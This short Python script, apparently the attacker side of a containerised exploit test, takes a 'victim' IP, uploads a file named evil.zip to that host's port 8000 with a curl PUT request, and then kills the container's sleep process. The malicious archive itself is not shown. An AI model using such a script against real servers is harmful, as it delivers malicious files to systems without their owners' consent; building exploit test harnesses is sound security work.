import os
import subprocess
import sys

if __name__ == '__main__':
    # get the victim ip
    victim = sys.argv[1]
    target_port = "8000"
    print(f"trying to exploit {victim}")
    # send the malicious evil.zip to the victim
    file = "/home/evil.zip"
    target = "http://" + victim + ":" + target_port
    print("sending: " + file + " to " + target)
    subprocess.run(["curl", "-X", "PUT", "--upload-file", file, target])

    # shutdown docker container by killing main process after exploit is finished
    print("exploit finished - shutting down")
    os.system("killall sleep")
